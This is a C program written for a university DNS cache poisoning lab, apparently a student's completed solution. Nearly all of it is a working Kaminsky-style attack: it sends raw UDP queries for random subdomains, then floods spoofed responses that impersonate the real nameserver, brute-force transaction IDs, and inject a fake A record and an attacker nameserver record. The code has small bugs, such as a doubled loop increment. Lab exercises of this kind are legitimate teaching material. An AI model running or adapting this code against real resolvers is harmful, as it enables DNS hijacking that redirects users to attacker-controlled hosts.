// ----udp.c------
// For use with the Remote DNS Cache Poisoning Attack Lab
// Sample program used to spoof lots of different DNS queries to the victim.
//
// Wireshark can be used to study the packets, however, the DNS queries 
// sent by this program are not enough for to complete the lab.
//
// The response packet needs to be completed.
//
// Compile command:
// gcc udp.c -o udp
//
// The program must be run as root
// sudo ./udp

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

// The IP header's structure
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;

};
struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd{
    unsigned short int  type;
    unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)

// answer session & authority session end
struct asEnd{
	unsigned short int type;
	unsigned short int class;
	unsigned short int ttl_l;
	unsigned short int ttl_h;
	unsigned short int datalen;
};

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum=0;
    for(;isize>1;isize-=2){
        cksum+=*usBuff++;
    }
    if(isize==1){
        cksum+=*(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
    struct ipheader *tempI=(struct ipheader *)(buffer);
    struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
    struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
    tempH->udph_chksum=0;
    sum=checksum((uint16_t *)&(tempI->iph_sourceip),8);
    sum+=checksum((uint16_t *)tempH,len);
    sum+=ntohs(IPPROTO_UDP+len);
    sum=(sum>>16)+(sum & 0x0000ffff);
    sum+=(sum>>16);
    return (uint16_t)(~sum);
}
// Function for checksum calculation. From the RFC791,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// socket descriptor
int sd;
// address
struct sockaddr_in local_dns_in;


void query(char* fake_domain_name, char* local_ip_addr, char* local_dns_addr) {
    // buffer to hold the packet
    char buffer[PCKT_LEN];

    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    ////////////////////////////////////////////////////////////////////////
    dns->query_id=rand(); // transaction ID for the query packet, use random #

    //The flag you need to set
    dns->flags=htons(FLAG_Q); // zz: dns query
    
    //only 1 query, so the count should be one.
    dns->QDCOUNT=htons(1);

    //query string
    strcpy(data, fake_domain_name);
    int length= strlen(data)+1;

    //this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP

    // attacker local ip
    ip->iph_sourceip = inet_addr(local_ip_addr);

    // local dns server ip
    ip->iph_destip = inet_addr(local_dns_addr);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(40000+rand()%10000);  // source port number. remember the lower number may be reserved
    
    // Destination port number
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd));

    // Calculate the checksum for integrity
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));

    // send the packet out.
    if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&local_dns_in, sizeof(local_dns_in)) < 0)
        printf("packet send error %d which means %s\n",errno,strerror(errno));

    // printf("[DEBUG] query message with length %u:\n", packetLength);
    // for (int i = 0; i < packetLength; i++)
    //     printf("%02x", ((unsigned char*)buffer)[i]);
    // printf("\n");
}

void response(char* fake_domain_name, char* local_dns_addr) {
    const char* true_dns_addr = "199.43.135.53"; // true dns nameserver for example.com obtain by dig, hardcode it here

    // buffer to hold the packet
    char buffer[PCKT_LEN];

    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    ////////////////////////////////////////////////////////////////////////

    //The flag you need to set
    dns->flags=htons(FLAG_R); // zz: no-error answer
    
    // zz: need all question, answer, authority & additional session for response
    dns->QDCOUNT = htons(1);
    dns->ANCOUNT = htons(1);
    dns->ARCOUNT = htons(1);
    dns->NSCOUNT = htons(1);

    unsigned int current_offset = sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader);
    // ----------------------------------
    //  zz: query session
    // ----------------------------------
    char* data = buffer + current_offset;
    strcpy(data, fake_domain_name);
    int query_str_length = strlen(data) + 1; // include null end byte
    current_offset += query_str_length;

    //this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd* query_end = (struct dataEnd*)(buffer + current_offset);
    query_end->type=htons(1); // type: A
    query_end->class=htons(1); // Class: IN
    current_offset += sizeof(struct dataEnd);

    // ----------------------------------
    //  zz: answer session
    // ----------------------------------
    unsigned char *ans = buffer + current_offset;
    *ans = 0xc0; // zz: first two bits set to 1 to notify this is a pointer for a name string, not a standard
    *(ans + 1) = 0x0c; // zz: the offset of the start point: here from transaction ID field to the name string, 12 bytes
    current_offset += 2; // zz: 2 bytes 0x0cc0
    
    struct asEnd* ans_end = (struct asEnd*)(buffer + current_offset);
    ans_end->type = htons(1); // type: A
    ans_end->class = htons(1); // Class: IN
    ans_end->ttl_l = htons(0xff); // set a long time
    ans_end->ttl_h = htons(0xff); // set a long time
    ans_end->datalen = htons(4); // 4 bytes
    current_offset += sizeof(struct asEnd);

    char* ans_addr = buffer + current_offset;
    strcpy(ans_addr, "\1\1\1\1"); // malicious address 1.1.1.1
    int ans_addr_len = strlen(ans_addr);
    current_offset += ans_addr_len;

    // ----------------------------------------
    //  zz: authoritative nameserver section
    // ----------------------------------------
    unsigned char *authns = buffer + current_offset;
    *authns = 0xc0; // zz: first two bits set to 1 to notify this is a pointer for a name string, not a standard
    *(authns + 1) = 0x12; // zz: the offset of the start point: here from transaction ID field to the name string, 18 bytes
    current_offset += 2; // zz: 2 bytes 0x0c12

    struct asEnd* authns_end = (struct asEnd*)(buffer + current_offset);
    authns_end->type = htons(2); // type: NS
    authns_end->class = htons(1); // Class: IN
    authns_end->ttl_l = htons(0xff); // set a long time
    authns_end->ttl_h = htons(0xff); // set a long time
    authns_end->datalen = htons(23); // "/2ns/14dnslabattacker/3net"
    current_offset += sizeof(struct asEnd);

    char* authns_name = buffer + current_offset;
    strcpy(authns_name, "\2ns\16dnslabattacker\3net");
    int authns_name_len = strlen(authns_name) + 1; // include null end byte
    current_offset += authns_name_len;

    // ----------------------------------------
    //  zz: additional section
    // ----------------------------------------
    char *ads_name = buffer + current_offset;
    strcpy(ads_name, "\2ns\16dnslabattacker\3net");
    int ads_name_len = strlen(ads_name) + 1;
    current_offset += ads_name_len;

    struct asEnd* ads_end = (struct asEnd*)(buffer + current_offset);
    ads_end->type = htons(1); // type: A
    ads_end->class = htons(1); // Class: IN
    ads_end->ttl_l = htons(0xff); // set a long time
    ads_end->ttl_h = htons(0xff); // set a long time
    ads_end->datalen = htons(4); // 4 bytes
    current_offset += sizeof(struct asEnd);

    char* ads_addr = buffer + current_offset;
    strcpy(ads_addr, "\1\1\1\1"); // malicious address 1.1.1.1
    int ads_addr_len = strlen(ads_addr);
    current_offset += ads_addr_len;

    /////////////////////////////////////////////////////////////////////
    //
    // DNS format, relate to the lab, you need to change them, end
    //
    //////////////////////////////////////////////////////////////////////

    /*************************************************************************************
      Construction of the packet is done. 
      now focus on how to do the settings and send the packet we have composed out
     ***************************************************************************************/

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    unsigned short int packetLength = current_offset;
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP

    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(true_dns_addr);

    // The destination IP address
    ip->iph_destip = inet_addr(local_dns_addr);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(53); // source port number. remember the lower number may be reserved
    
    // Destination port number
    udp->udph_destport = htons(33333);
    udp->udph_len = htons(packetLength - sizeof(struct ipheader));

    // Calculate the checksum for integrity
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    // udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    
    /*******************************************************************************8
      Tips

      the checksum is quite important to pass integrity checking. You need 
      to study the algorithem and what part should be taken into the calculation.

      !!!!!If you change anything related to the calculation of the checksum, you need to re-
      calculate it or the packet will be dropped.!!!!!

      Here things became easier since the checksum functions are provided. You don't need
      to spend your time writing the right checksum function.
      Just for knowledge purposes,
      remember the seconed parameter
      for UDP checksum:
      ipheader_size + udpheader_size + udpData_size  
      for IP checksum: 
      ipheader_size + udpheader_size
     *********************************************************************************/

    int count;
    int trans_id = rand() % 65536;
    for (count = 0; count < 1024; count++) { // zz: try 1024 continuous random transaction id
        dns->query_id = (trans_id + count) % 65536;

        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&local_dns_in, sizeof(local_dns_in)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));
        count++;
        // printf("[DEBUG] response message with length %u:\n", packetLength);
        // for (int i = 0; i < packetLength; i++)
        //     printf("%02x", ((unsigned char*)buffer)[i]);
        // printf("\n");
    }

}

int main(int argc, char *argv[])
{
    // This is to check the argc number
    if(argc != 3){
        printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
        exit(-1);
    }

    // // socket descriptor
    // int sd;



    /////////////////////////////////////////////////////////////////////
    //
    // DNS format, relate to the lab, you need to change them, end
    //
    //////////////////////////////////////////////////////////////////////

    /*************************************************************************************
      Construction of the packet is done. 
      now focus on how to do the settings and send the packet we have composed out
     ***************************************************************************************/
    
    // Source and destination addresses: IP and port
    int one = 1;
    const int *val = &one;

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0) // if socket fails to be created 
        printf("socket error\n");

    // Inform the kernel to not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
        printf("error\n");	
        exit(-1);
    }

    // ----------------------------------
    //  zz: local dns server config
    // ----------------------------------
    // The address family
    local_dns_in.sin_family = AF_INET;
    // Port numbers
    local_dns_in.sin_port = htons(33333); // local dns server port, set to 333333 in /etc/bind/named.conf.options
    // IP addresses
    local_dns_in.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program

    
    /*******************************************************************************8
      Tips

      the checksum is quite important to pass integrity checking. You need 
      to study the algorithem and what part should be taken into the calculation.

      !!!!!If you change anything related to the calculation of the checksum, you need to re-
      calculate it or the packet will be dropped.!!!!!

      Here things became easier since the checksum functions are provided. You don't need
      to spend your time writing the right checksum function.
      Just for knowledge purposes,
      remember the seconed parameter
      for UDP checksum:
      ipheader_size + udpheader_size + udpData_size  
      for IP checksum: 
      ipheader_size + udpheader_size
     *********************************************************************************/

    char fake_domain_name[20] = "\5aaaaa\7example\3edu";
    while(1)
    {	
        // This is to generate a different query in xxxxx.example.edu
        //   NOTE: this will have to be updated to only include printable characters
        int charnumber;
        charnumber=1+rand()%5;
        // *(data+charnumber)+=1;
        *(fake_domain_name+charnumber) = (*(fake_domain_name+charnumber) - 'a' + 1) %26 + 'a'; // zz: a-z

        // udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
        query(fake_domain_name, argv[1], argv[2]);
        sleep(0.5); // wait for the request to be sent
        response(fake_domain_name, argv[2]);
    }
    close(sd);
    return 0;
}

